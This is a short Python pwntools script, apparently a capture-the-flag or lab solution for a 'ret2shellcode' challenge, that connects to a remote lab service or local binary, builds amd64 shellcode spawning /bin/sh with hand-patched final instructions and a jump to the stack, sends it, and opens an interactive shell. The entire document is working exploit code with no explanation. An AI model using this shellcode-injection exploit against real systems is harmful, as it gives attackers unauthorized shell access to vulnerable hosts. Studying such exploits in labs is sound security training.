from pwn import *

local = False
elf = 'ret2shellcode' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "sqlab.zongyuan.nctu.me"
	port = 6004
	r = remote(ip,port)

context.arch = "amd64"
shellcode = (shellcraft.sh())
shellcode = shellcode.split('\n')
shellcode[-2] = u'\tmov rbx, 0x01110101'
shellcode[-1] = u'\tsub rbx, 0x0110fbf2'
shellcode.append(u'push rbx')
shellcode.append(u'\tjmp rsp')
shellcode.append(u'')
shellcode = '\n'.join(shellcode)
shellcode = asm(shellcode)

print(r.recvuntil('\n'))
r.sendline(shellcode)
r.interactive()
